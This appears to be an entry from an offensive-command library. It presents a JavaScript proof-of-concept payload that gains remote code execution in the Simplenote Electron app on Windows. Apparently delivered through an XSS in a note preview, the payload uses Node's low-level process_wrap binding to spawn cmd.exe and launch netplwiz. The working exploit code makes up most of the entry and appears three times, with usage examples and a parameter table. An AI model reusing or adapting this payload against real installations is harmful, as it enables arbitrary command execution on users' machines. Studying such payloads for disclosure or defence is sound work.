---
id: cmd-spawn-windows
data: >-
  write("<h1>Simplenote RCE via Electron - Windows - ysx</h1>");
  write("<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please
  stand by!</h3>"); var Process = process.binding('process_wrap').Process; var
  proc = new Process(); proc.onexit = function(a,b) {}; var env = process.env;
  var env_ = []; for (var key in env) env_.push(key+'='+env[key]);
  proc.spawn({file:'cmd.exe',args:['/k
  netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
tags:
  - rce
  - process-spawn
type: command
output: null
executor: javascript
platforms:
  - Windows
  - Electron
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.280Z'
verified: false
validated: true
submitted: true
---
# Spawn Process via Electron Process API (Windows)

## Command

```javascript
write("<h1>Simplenote RCE via Electron - Windows - ysx</h1>"); write("<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>"); var Process = process.binding('process_wrap').Process; var proc = new Process(); proc.onexit = function(a,b) {}; var env = process.env; var env_ = []; for (var key in env) env_.push(key+'='+env[key]); proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

## Description

This JavaScript command, executed in Electron's renderer with Node.js integration, writes HTML to the page and spawns netplwiz via cmd.exe using the low-level Process API, demonstrating RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| file | Executable to spawn (cmd.exe) | Yes |
| args | Arguments array (['/k netplwiz']) | Yes |
| cwd | Working directory (null) | No |
| windowsVerbatimArguments | Boolean for argument parsing (false) | No |
| detached | Spawn detached (false) | No |
| envPairs | Environment variables array | Yes |
| stdio | I/O configuration (ignore all) | Yes |

## Examples

### Basic Usage

```javascript
var Process = process.binding('process_wrap').Process; var proc = new Process(); proc.onexit = function(a,b) {}; var env = process.env; var env_ = []; for (var key in env) env_.push(key+'='+env[key]); proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

### Advanced Usage

Include HTML writes for visual confirmation as in the full command.

## Expected Output

Launches netplwiz executable on Windows after a delay; HTML messages appear in the rendered note.

## Related

- [[commands/spawn-process-via-electron-process-api-linux]]
- [[procedures/Trigger-XSS-by-Previewing-Note]]
